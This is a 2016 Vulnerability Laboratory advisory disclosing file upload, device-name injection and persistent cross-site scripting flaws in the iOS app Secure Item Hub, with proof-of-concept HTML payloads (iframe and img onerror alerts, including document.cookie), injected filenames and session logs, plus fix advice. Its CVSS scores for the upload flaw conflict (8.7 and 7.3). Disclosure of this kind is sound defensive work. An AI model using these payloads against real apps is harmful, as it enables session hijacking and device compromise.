@@ -1,0 +1,465 @@
+Document Title:
+===============
+Secure Item Hub v1.0 iOS - Multiple Web Vulnerabilities
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1682
+
+
+Release Date:
+=============
+2016-01-27
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1682
+
+
+Common Vulnerability Scoring System:
+====================================
+7.3
+
+
+Product & Service Introduction:
+===============================
+Transfer files to and from any computer connected to the same WiFi network as your iPhone or iPad using just a web browser! Just drag and drop 
+files into the browser (requires a current version of Chrome, Firefox or Safari) and watch the files appear on your device. You can also connect 
+to other iOS devices that have the Secure Item Hub app and transfer files directly between devices!
+
+(Copy of the Homepage: https://itunes.apple.com/in/app/secure-item-hub-wifi-file/id537353277 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Research Team discovered multiple vulnerabilities in the official Secure Item Hub - WiFi File Sharing mobile iOS wifi web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2016-01-27:	Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Pinfolio LLC
+Product: Secure Item Hub - WiFi File Sharing 1.0
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+1.1
+An arbitrary file upload web vulnerability has been discovered in the Secure Item Hub - WiFi File Sharing mobile iOS wifi web-application.
+The arbitrary file upload web vulnerability allows remote attackers to unauthorized include local file/path requests or system specific path 
+commands to compromise the mobile web-application.
+
+The web vulnerability is located in the `filename` value of the `Upload` module. Remote attackers are able to inject own files with malicious `filename` 
+values in the `Upload` POST method request to compromise the mobile web-application. The local file/path include execution occcurs in the index file dir 
+listing and sub folders of the wifi interface. The attacker is able to inject the lfi payload by usage of the wifi interface or the local file sync function.
+The attacker can also attach multiple file extensions to bypass the web-server file validation to execute a malicious web-shell finally. Remote attackers can 
+exchange the filename with a double or tripple extension via POST method to bypass the upload validation and filter process. After the upload the attacker access 
+the file with one extension and exchange it with the other one to execute for example own php codes.
+
+Attackers are also able to exploit the filename issue in combination with persistent injected script code to execute different malicious attack requests. 
+The attack vector is located on the application-side of the wifi service and the request method to inject is POST. 
+
+The security risk of the local file include vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 8.7. 
+Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privileged web-application user account. 
+Successful exploitation of the arbitrary file upload vulnerability results in mobile application compromise or connected device component compromise.
+
+Request Method(s):
+				[+] [POST]
+
+Vulnerable Module(s):
+				[+] Upload
+				[+] Rename
+
+Vulnerable Parameter(s):
+				[+] filename
+				[+] pairs
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost:8000/)
+
+
+
+1.2
+A local command/path injection web vulnerabilities has been discovered  in the official Secure Item Hub - WiFi File Sharing mobile iOS wifi web-application.
+The vulnerability allows attackers to inject local commands via vulnerable system values to compromise the apple mobile iOS application.
+
+The vulnerability is located in the vulnerable `devicename` value that becomes visible in the `file dir (index)` module. Local attackers are able to inject own 
+malicious system specific commands or path value requests in the vulnerable `devicename` value. The execution of the local command inject occurs in the `index` 
+module of the mobile application. The attacker is able to manipulate the header name information of the application by preparing to change the local devicename. 
+The encoding of the vulnerable values in the index header module is broken.
+
+The attack vector is on the application-side and the injection requires physical device access or a local low privileged user account. Local attackers are also 
+able to exploit the filename validation issue in combination with persistent injected script codes to execute different local malicious attacks requests.
+
+The security risk of the local command/path inject vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 6.1.
+Exploitation of the command/path inject vulnerability requires a low privileged iOS device account with restricted access and no user interaction. 
+Successful exploitation of the vulnerability results in unauthorized execution of system specific commands and unauthorized path value requests to 
+compromise the mobile iOS application or the connected device components.
+
+Request Method(s):
+				[+] [SYNC]
+
+Vulnerable Module(s):
+				[+] Header Location - Web Application
+
+Vulnerable Parameter(s):
+				[+] devicename (HierarchyText)
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost:8000/)
+
+
+
+
+1.3
+A persistent input validation web vulnerability has been discovered  in the official Secure Item Hub - WiFi File Sharing mobile iOS wifi web-application.
+The vulnerability allows remote attacker to inject malicious persistent script codes to the application-side of the mobile application.
+
+The vulnerability is located in the path and name (class) values of the `New Folder` and `NewTextFile` modules. The request method to inject is POST and 
+the attack vector is located on the application-side of the mobile app. Remote attackers are able to inject via POST own malicious script codes to compromise 
+the wifi web-application index file dir listing. The validation and encoding of the `New Folder` and `NewTextFile` modules are broken and allows to inject 
+malicious persistent script codes.
+
+The security risk of the application-side web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.6.
+Exploitation of the application-side web vulnerability requires no privileged web-application user account and only low or medium user interaction.
+Successful exploitation of the vulnerabilities results in persistent phishing, session hijacking, persistent external redirect to malicious 
+sources and application-side manipulation of affected or connected module context.
+
+Request Method(s):
+					[+] [POST]
+
+Vulnerable Module(s):
+					[+] NewTextFile
+					[+] New Folder
+
+Vulnerable Parameter(s):
+					[+] path
+					[+] name (class)
+
+Affected Module(s):
+					[+] Index File Dir Listing (http://localhost:8000/)
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The arbitrary file upload web vulnerability can be exploited by remote attackers without privileged web-application user account or user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+
+PoC:
+<tr><td width="20"> </td><td width="50"><input id="checkbox_0" type="checkbox"></td><td valign="top" width="70">
+<a href=">"><iframe>.png" target="_blank"><img border=0 class=thumbnail src=">"><iframe>.png"></a></td><td valign=top><div>
+<a target="_blank" class=DirectoryListingLink href="[ARBITRARY FILE UPLOAD VULNERABILITY!].png</a></div><div style="padding-top:5px;" 
+class="SmallText">PNG Image | 538 bytes | modified Mo., 25. Jan., 10:44<BR>
+<span class=SmallTextButton onclick="renameItem(0);">Rename</span></div></td></tr></table></div></div>
+
+
+-- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://localhost:8080/Files// Load Flags[LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[156] Mime Type[text/html]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/Files/]
+      Content-Length[722]
+      Content-Type[multipart/form-data; boundary=---------------------------32641154472465]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------32641154472465
+Content-Disposition: form-data; name="file"; filename="[ARBITRARY FILE UPLOAD VULNERABILITY!].png"
+Content-Type: image/png
+-
+Status: 200[OK]
+GET http://localhost:8080/Files/ Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[7148] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+      Cache-Control[max-age=0]
+   Response Header:
+      Content-Length[7148]
+      Date[Mon, 25 Jan 2016 09:42:53 GMT]
+      Server[Pinfolio (modified lighttpd)]
+-
+Status: 200[OK]
+POST http://localhost:8080/API/MoveItems Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[2] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+      Referer[http://localhost:8080/Files/]
+      Content-Length[39]
+      Connection[keep-alive]
+   POST-Daten:
+      pairs[2.png%09%3E%22%3E%3Ciframe%3E.png]
+   Response Header:
+      Content-Length[2]
+      Date[Mon, 25 Jan 2016 09:45:16 GMT]
+      Server[Pinfolio (modified lighttpd)]
+-
+Status: 200[OK]
+GET http://localhost:8080/Files/ Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[7198] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/]
+      Connection[keep-alive]
+      Cache-Control[max-age=0]
+   Response Header:
+      Content-Length[7198]
+      Date[Mon, 25 Jan 2016 09:45:18 GMT]
+      Server[Pinfolio (modified lighttpd)]
+
+
+1.2
+The local command inject web vulnerability can be exploited by local attackers with local privileged system user account and without user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC: Index - Header Information (Web-Application)
+<title>Files</title>
+</head><body>
+<table border=0 cellpadding=0 cellspacing=0 style="width:100%;margin-top:40px;">
+	<tr>
+		<td width=65> </td>
+		<td valign=top>
+			<div class="HierarchyText">
+				<a href="/" class="HierarchyText"><b>ktest2 "><[COMMAND INJECT VULNERABILITY!]"></b></a>  > 
+				<span id="hierarchy"></span>
+			</div>
+			<div id="title" class="Title" style="padding-top:8px;padding-bottom:30px;">Files</div>
+		</td>
+		<td width=200 align=right valign=top>
+			<div id="signOutButtonArea" style="padding-top:20px;">
+				<span onclick="signOut();" style="cursor:pointer;">Sign Out</span>
+			</div>
+		</td>
+		<td width=65> </td>
+	</tr>
+</table>
+
+--- PoC Session Logs [GET]---
+GET http://localhost:8080/Files/ Load Flags[LOAD_FROM_CACHE  VALIDATE_NEVER  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[-1] Mime Type[unbekannt]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/]
+
+
+
+1.3
+The persistent input validation web vulnerabilities can be exploited by remote attackers without local privileged web-application user account and with low or medium user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC: NewTextFile
+<tr><td width="20"> </td><td width="50"><input id="checkbox_0" type="checkbox"></td><td valign="top" width="70">
+<div style="padding-top:5px;"><img src="/Resources/img/folder-icon.png"></div></td><td valign="top"><div><a target="_self" 
+class="DirectoryListingLink" href=""><iframe src="a" onload="alert("PENTEST")" <"="[PERSISTENT INEJCTED SCRIPT CODE!]">"><iframe src=a onload=alert("PENTEST") <</a></div>
+<div style="padding-top:5px;"><span class=SmallTextButton onclick="renameItem(0);">Rename</span></div></td></tr></table></div>
+
+
+PoC: NewTextFile
+PoC: Folder
+<td valign="top"><div><a target="_self" class="DirectoryListingLink" href="<h>xxs link
+<a>[PERSISTENT INEJCTED SCRIPT CODE!]<img src=" c"="" onerror="alert(document.domain)">"><h>xxs link</h></a><a><img src="c" onerror="alert(document.cookie)"></a></div>
+<div style="padding-top:5px;"><span class="SmallTextButton" onclick="renameItem(0);">Rename</span></div></td>
+
+
+--- PoC Session Logs [POST]---
+Status: 200[OK]
+GET http://localhost:8080/Files/c[PERSISTENT SCRIPT CODE EXECUTION!] Load Flags[LOAD_DOCUMENT_URI  ] Größe des Inhalts[345] Mime Type[text/html]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/Files/]
+      Connection[keep-alive]
+   Response Header:
+      Content-Type[text/html]
+      Content-Length[345]
+      Date[Mon, 25 Jan 2016 09:54:49 GMT]
+      Server[Pinfolio (modified lighttpd)]
+-
+Status: 200[OK]
+POST http://localhost:8080/API/NewTextFile Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[2] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+      Referer[http://localhost:8080/Files/]
+      Content-Length[56]
+      Connection[keep-alive]
+   POST-Daten:
+      path[%22%3E%3Cimg%3E%2520%22%3C[PERSISTENT INJECTED SCRIPT CODE VULNERABILITY!]%20src%3D%22c%22%3E]
+   Response Header:
+      Content-Length[2]
+      Date[Mon, 25 Jan 2016 09:54:55 GMT]
+      Server[Pinfolio (modified lighttpd)]
+-
+Status: 200[OK]
+GET http://localhost:8080/Files/ Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[9636] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/Files/]
+      Connection[keep-alive]
+      Cache-Control[max-age=0]
+   Response Header:
+      Content-Length[9636]
+      Date[Mon, 25 Jan 2016 09:54:55 GMT]
+      Server[Pinfolio (modified lighttpd)]
+-
+Status: 200[OK]
+POST http://localhost:8080/API/CreateFolder Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[23] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+      Referer[http://localhost:8080/Files/]
+      Content-Length[56]
+      Connection[keep-alive]
+   POST-Daten:
+      path[%22%3E%3Cimg%3E%2520%22%3C[PERSISTENT INJECTED SCRIPT CODE VULNERABILITY!]%20src%3D%22c%22%3E]
+   Response Header:
+      Content-Length[23]
+      Date[Mon, 25 Jan 2016 09:55:00 GMT]
+      Server[Pinfolio (modified lighttpd)]
+-
+Status:  200[OK]
+GET http://localhost:8080/Files/c[PERSISTENT SCRIPT CODE EXECUTION!] Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[345] Mime Type[text/html]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      DNT[1]
+      Referer[http://localhost:8080/Files/]
+      Connection[keep-alive]
+      Cache-Control[max-age=0]
+   Response Header:
+      Content-Type[text/html]
+      Content-Length[345]
+      Date[Mon, 25 Jan 2016 09:55:02 GMT]
+      Server[Pinfolio (modified lighttpd)]
+
+
+Solution - Fix & Patch:
+=======================
+1.1
+The arbitrary file upload vulnerability can be patched by a secure parse and validation of the filename value in the upload POST method request.
+Restrict the input and disallow special chars or script code tags to prevent an attack. Disallow usage of multiple file extensions and approve them as well.
+
+1.2
+The local command inject vulnerability can be patched by a secure parse and encode of the header location in the file dir listing index, were the devicename is displayed.
+
+1.3
+The persistent input validation web vulnerability can be patched by a secure encode and parse of the `path` and `name (class)` values in 
+the `NewTextFile` or `New Folder` modules. Disallow usage of special chars on input to prevent persistent script code injection attacks.
+Encode the index output values to prevent the execution point of the issue.
+
+
+Security Risk:
+==============
+1.1
+The security risk of the arbitrary file upload web vulnerability in the filename value on upload is estimated as high. (CVSS 7.3)
+
+1.2
+The local command inject web vulnerability in the device name value is estimated as medium. (CVSS 6.1)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz mejri (research@vulnerability-lab.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
